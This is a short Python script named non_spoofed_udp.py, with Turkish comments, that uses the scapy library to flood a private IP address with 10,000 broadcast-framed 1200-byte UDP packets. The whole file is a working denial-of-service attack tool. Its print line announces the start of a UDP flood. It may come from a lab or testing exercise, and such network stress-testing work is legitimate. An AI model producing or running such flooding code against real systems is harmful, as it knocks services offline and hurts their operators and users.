# non_spoofed_udp.py
from scapy.all import *

target_ip = "10.0.5.12"
payload = "X" * 1200 # Buyuk paket boyutu
count = 10000

print(f"Gercek IP ile UDP Flood baslatiliyor: {target_ip}")

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / UDP(dport=12345) / Raw(load=payload)

sendp(pkt, count=count, inter=0.001, verbose=0)